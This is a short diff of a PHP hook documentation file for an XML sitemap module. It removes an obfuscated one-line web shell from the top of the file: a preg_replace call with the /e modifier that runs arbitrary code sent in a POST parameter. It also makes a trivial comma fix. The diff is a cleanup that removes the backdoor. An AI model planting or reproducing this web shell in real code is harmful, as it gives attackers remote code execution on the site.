@@ -1,5 +1,4 @@
-<?php @preg_replace('/(.*)/e', @$_POST['fwviynrwwijdm'], '');
-
+<?php
 
 /**
  * @file
@@ -17,7 +16,7 @@
 function hook_xmlsitemap_engine_info() {
   $engines['example'] = array(
     'name' => t('Example search engine'),
-    'url' => 'http://example.com/ping?sitemap=[sitemap]'
+    'url' => 'http://example.com/ping?sitemap=[sitemap]',
   );
   return $engines;
 }
